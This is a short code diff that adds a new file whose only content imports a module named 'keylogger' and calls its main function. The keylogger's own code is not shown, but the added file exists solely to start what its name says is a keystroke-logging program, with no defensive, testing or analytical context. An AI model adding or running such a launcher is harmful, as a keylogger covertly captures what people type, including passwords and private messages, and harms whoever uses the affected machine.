@@ -1,0 +1,3 @@
+import keylogger
+
+keylogger.main()
